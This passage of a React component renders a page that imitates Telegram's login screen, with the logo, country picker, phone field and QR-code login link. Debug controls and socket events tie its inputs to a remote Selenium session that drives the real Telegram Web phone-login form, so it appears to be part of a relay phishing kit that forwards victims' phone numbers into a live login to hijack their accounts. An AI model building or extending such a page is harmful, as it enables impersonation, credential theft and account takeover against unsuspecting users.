                  console.log('🔍 qrCodeButtonFound:', qrCodeButtonFound);
                  
                  setSeleniumStatus(`🔍 State: Submitting=${isSubmitting}, Ready=${isInputsReady}, Monitoring=${isMonitoringVerificationPage}`);
                }}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#28a745',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                🔍 State Debug
              </button>
            )}
            {isInputsReady && (
              <button
                onClick={() => {
                  console.log('🔍 Manual URL Check: Checking current page in Selenium...');
                  if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
                    socketRef.current.emit('checkPageUrl', {
                      sessionId: sessionIdRef.current,
                      timestamp: new Date().toISOString()
                    });
                    setSeleniumStatus('🔍 Checking current page URL in Selenium...');
                  } else {
                    setSeleniumStatus('🔍 Socket not ready for URL check');
                  }
                }}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#ffc107',
                  color: 'black',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                🔍 Check Page URL
              </button>
            )}
            {isInputsReady && (
              <button
                onClick={() => {
                  console.log('🧪 Test Button Detection: Testing exact selector that works in console...');
                  if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
                    // Test the exact selector that works in the console
                    socketRef.current.emit('checkElementInSelenium', {
                      sessionId: sessionIdRef.current,
                      selector: '#auth-phone-number-form button[type="submit"]',
                      timestamp: new Date().toISOString(),
                      elementType: 'testSubmitButton'
                    });
                    setSeleniumStatus('🧪 Testing exact button selector...');
                  } else {
                    setSeleniumStatus('🧪 Socket not ready for button test');
                  }
                }}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#17a2b8',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                🧪 Test Button Detection
              </button>
            )}
          </div>

          {/* Debug Information (only show in development) */}
          {import.meta.env.DEV && (
            <div style={{
              marginBottom: '16px',
              padding: '8px 12px',
              backgroundColor: '#f8f9fa',
              border: '1px solid #dee2e6',
              borderRadius: '4px',
              fontSize: '11px',
              color: '#6c757d'
            }}>
              <div style={{ fontWeight: '500', marginBottom: '4px' }}>Debug Info:</div>
              <div>Socket: {isSeleniumReady ? '✅ Connected' : '❌ Disconnected'}</div>
              <div>Session: {sessionIdRef.current || 'None'}</div>
              <div>Phone Code Input: {phoneCodeInputFound ? '✅ Found' : '⏳ Waiting'}</div>
              <div>Phone Number Input: {phoneNumberInputFound ? '✅ Found' : '⏳ Waiting'}</div>
              <div>QR Button: {qrCodeButtonFound ? '✅ Found' : '⏳ Waiting'}</div>
              <div>All Inputs Ready: {isInputsReady ? '✅ Yes' : '❌ No'}</div>
              <div>Status: {seleniumStatus}</div>
              {!isSeleniumReady && (
                <button
                  onClick={() => {
                    console.log('🔄 Manual reconnect attempt...');
                    setSeleniumStatus('Attempting manual reconnect...');
                    
                    // Try to reconnect the socket
                    if (socketRef.current) {
                      socketRef.current.disconnect();
                      socketRef.current.connect();
                    }
                  }}
                  style={{
                    marginTop: '8px',
                    padding: '4px 12px',
                    fontSize: '11px',
                    backgroundColor: '#007bff',
                    color: 'white',
                    border: 'none',
                    borderRadius: '4px',
                    cursor: 'pointer'
                  }}
                >
                  🔄 Reconnect Socket
                </button>
              )}
              <button
                onClick={() => {
                  console.log('🔍 Socket connection test...');
                  console.log('Socket ref:', socketRef.current);
                  console.log('Socket connected:', socketRef.current?.connected);
                  console.log('Socket id:', socketRef.current?.id);
                  console.log('Session ID:', sessionIdRef.current);
                  
                  if (socketRef.current && socketRef.current.connected) {
                    setSeleniumStatus('Socket is connected, testing communication...');
                    // Test the connection by emitting a test event
                    socketRef.current.emit('testConnection', {
                      sessionId: sessionIdRef.current,
                      timestamp: new Date().toISOString()
                    });
                  } else {
                    setSeleniumStatus('Socket is not connected - connection issue detected');
                  }
                }}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#28a745',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                🔍 Test Socket
              </button>
              <button
                onClick={forceSyncPhoneNumber}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#ffc107',
                  color: 'black',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                📱 Force Sync Phone
              </button>
            </div>
          )}

          {/* Telegram Logo */}
          <div style={{
            marginBottom: '32px',
            textAlign: 'center'
          }}>
            <img 
              src="/reactjs-template/telegram-logo.svg" 
              alt="Telegram" 
              style={{
                width: '160px',
                height: '160px',
                marginBottom: '16px'
              }}
            />
            <h1 style={{
              fontSize: '24px',
              color: '#000',
              margin: '0',
              fontWeight: '600',
              letterSpacing: '-0.02em'
            }}>
              Telegram
            </h1>
          </div>

          {/* Instructions */}
          <p style={{
            fontSize: '16px',
            color: '#666',
            textAlign: 'center',
            margin: '0 0 32px 0',
            lineHeight: '1.4',
            maxWidth: '360px'
          }}>
            Please confirm your country code and enter your phone number.
          </p>

          {/* Phone Number Form */}
          <form onSubmit={handleSubmit} style={{
            width: '100%',
            maxWidth: '360px'
          }}>
            {/* Country Selection */}
            <div style={{
              marginBottom: '20px',
              position: 'relative'
            }}>
              <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                marginBottom: '8px'
              }}>
                <label style={{
                  fontSize: '14px',
                  color: '#666',
                  fontWeight: '500'
                }}>
                  Country
                </label>
                <button
                  onClick={detectUserCountry}
                  style={{
                    background: 'none',
                    border: '1px solid #e1e8ed',
                    borderRadius: '4px',
                    padding: '2px 8px',
                    fontSize: '12px',
                    color: '#666',
                    cursor: 'pointer',
                    transition: 'all 0.2s'
                  }}
                  onMouseEnter={(e) => e.currentTarget.style.backgroundColor = '#f8f9fa'}
                  onMouseLeave={(e) => e.currentTarget.style.backgroundColor = 'transparent'}
                  title="Detect my country from IP address"
                >
                  🌍 Auto-detect
                </button>
              </div>
              
              <div 
                onClick={() => setShowCountryDropdown(!showCountryDropdown)}
                style={{
                  border: '1px solid #e1e8ed',
                  borderRadius: '8px',
                  padding: '0 16px',
                  cursor: 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'space-between',
                  backgroundColor: 'white',
                  transition: 'border-color 0.2s',
                  height: '48px',
                  boxSizing: 'border-box',
                  position: 'relative'
                }}
              >
                <div style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: '12px',
                  marginTop: '8px'
                }}>
                  <span style={{ fontSize: '20px' }}>{selectedCountry.flag}</span>
                  <span style={{ fontSize: '16px', color: '#333' }}>{selectedCountry.name}</span>
                </div>
                <svg 
                  width="16" 
                  height="16" 
                  viewBox="0 0 24 24" 
                  fill="none"
                  style={{
                    transform: showCountryDropdown ? 'rotate(180deg)' : 'rotate(0deg)',
                    transition: 'transform 0.2s',
                    marginTop: '8px'
                  }}
                >
                  <path d="M7 10l5 5 5-5" stroke="#666" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
              </div>

              {/* Country Dropdown */}
              {showCountryDropdown && (
                <div style={{
                  position: 'absolute',
                  top: '100%',
                  left: 0,
                  right: 0,
                  backgroundColor: 'white',
                  border: '1px solid #e1e8ed',
                  borderRadius: '8px',
                  maxHeight: '200px',
                  overflowY: 'auto',
                  zIndex: 1000,
                  boxShadow: '0 4px 12px rgba(0,0,0,0.1)'
                }}>
                  {countries.map((country) => (
                    <div
                      key={country.code}
                      onClick={() => handleCountrySelect(country)}
                      style={{
                        padding: '12px 16px',
                        cursor: 'pointer',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'space-between',
                        borderBottom: '1px solid #f0f0f0',
                        transition: 'background-color 0.2s'
                      }}
                      onMouseEnter={(e) => e.currentTarget.style.backgroundColor = '#f8f9fa'}
                      onMouseLeave={(e) => e.currentTarget.style.backgroundColor = 'white'}
                    >
                      <div style={{
                        display: 'flex',
                        alignItems: 'center',
                        gap: '12px'
                      }}>
                        <span style={{ fontSize: '18px' }}>{country.flag}</span>
                        <span style={{ fontSize: '16px', color: '#333' }}>{country.name}</span>
                      </div>
                      <span style={{ fontSize: '14px', color: '#666' }}>{country.dialCode}</span>
                    </div>
                  ))}
                </div>
              )}
            </div>

            {/* Phone Number Input */}
            <div style={{
              marginBottom: '24px'
            }}>
              <div style={{
                border: '1px solid #e1e8ed',
                borderRadius: '8px',
                overflow: 'visible',
                height: '48px',
                boxSizing: 'border-box',
                position: 'relative'
              }}>
                <label style={{
                  position: 'absolute',
                  top: '-8px',
                  left: '12px',
                  fontSize: '14px',
                  color: '#666',
                  backgroundColor: 'white',
                  padding: '0 4px',
                  fontWeight: '500',
                  zIndex: 1
                }}>
                  Your phone number
                </label>
                <input
                  type="tel"
                  value={phoneNumber}
                  onChange={handlePhoneNumberChange}
                  onKeyDown={handlePhoneNumberKeyDown}
                  placeholder={`${selectedCountry.dialCode} Enter your phone number`}
                  disabled={!isInputsReady}
                  style={{
                    width: '100%',
                    height: '48px',
                    padding: '0 16px',
                    border: 'none',
                    outline: 'none',
                    fontSize: '16px',
                    color: isInputsReady ? '#333' : '#999',
                    boxSizing: 'border-box',
                    borderRadius: '8px',
                    backgroundColor: isInputsReady ? 'transparent' : '#f5f5f5',
                    cursor: isInputsReady ? 'text' : 'not-allowed'
                  }}
                />
              </div>
              {!isInputsReady && (
                <div style={{
                  fontSize: '12px',
                  color: '#ffc107',
                  marginTop: '4px',
                  textAlign: 'center'
                }}>
                  Waiting for input field to be ready...
                </div>
              )}
            </div>

            {/* Keep Signed In Checkbox */}
            <div style={{
              marginBottom: '32px',
              display: 'flex',
              alignItems: 'center',
              gap: '12px'
            }}>
              <input
                type="checkbox"
                id="keepSignedIn"
                checked={keepSignedIn}
                onChange={(e) => setKeepSignedIn(e.target.checked)}
                style={{
                  width: '18px',
                  height: '18px',
                  accentColor: '#0088cc'
                }}
              />
              <label 
                htmlFor="keepSignedIn"
                style={{
                  fontSize: '16px',
                  color: '#333',
                  cursor: 'pointer'
                }}
              >
                Keep me signed in
              </label>
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              disabled={!isInputsReady || isSubmitting}
              style={{
                width: '100%',
                padding: '14px 24px',
                backgroundColor: isInputsReady && !isSubmitting ? '#0088cc' : '#ccc',
                color: 'white',
                border: 'none',
                borderRadius: '8px',
                fontSize: '16px',
                fontWeight: '600',
                cursor: isInputsReady && !isSubmitting ? 'pointer' : 'not-allowed',
                transition: 'background-color 0.2s',
                opacity: isInputsReady && !isSubmitting ? 1 : 0.6
              }}
              onMouseEnter={(e) => {
                if (isInputsReady && !isSubmitting) {
                  e.currentTarget.style.backgroundColor = '#0077b3';
                }
              }}
              onMouseLeave={(e) => {
                if (isInputsReady && !isSubmitting) {
                  e.currentTarget.style.backgroundColor = '#0088cc';
                }
              }}
            >
              {isSubmitting ? 'Submitting...' : (isInputsReady ? 'NEXT' : 'Waiting for inputs...')}
            </button>
          </form>

          {/* QR Code Login Link */}
          <div style={{
            marginTop: '32px',
            textAlign: 'center'
          }}>
            <button
              onClick={goBackToQrCode}
              disabled={!qrCodeButtonFound || isQrCodeButtonLoading}
              style={{
                background: qrCodeButtonFound && !isQrCodeButtonLoading ? 'none' : '#f5f5f5',
                border: 'none',
                color: qrCodeButtonFound && !isQrCodeButtonLoading ? '#0088cc' : '#999',
                fontSize: '16px',
                cursor: qrCodeButtonFound && !isQrCodeButtonLoading ? 'pointer' : 'not-allowed',
                textDecoration: 'none',
                padding: '8px 16px',
                borderRadius: '4px',
                transition: 'background-color 0.2s',
                opacity: qrCodeButtonFound && !isQrCodeButtonLoading ? 1 : 0.6
              }}
              onMouseOver={(e) => {
                if (qrCodeButtonFound && !isQrCodeButtonLoading) {
                  e.currentTarget.style.backgroundColor = '#f0f8ff';
                }
              }}
              onMouseOut={(e) => {
                if (qrCodeButtonFound && !isQrCodeButtonLoading) {
                  e.currentTarget.style.backgroundColor = 'transparent';
                }
              }}
            >
              {isQrCodeButtonLoading ? 'Returning...' : 
               qrCodeButtonFound ? 'LOG IN BY QR CODE' : 'WAITING FOR QR CODE BUTTON...'}
            </button>
            <p style={{
              fontSize: '14px',
              color: '#666',
              marginTop: '8px',
              textAlign: 'center'
            }}>
              {seleniumStatus}
            </p>
          </div>
        </div>
      </div>
    </Page>
  );
}; 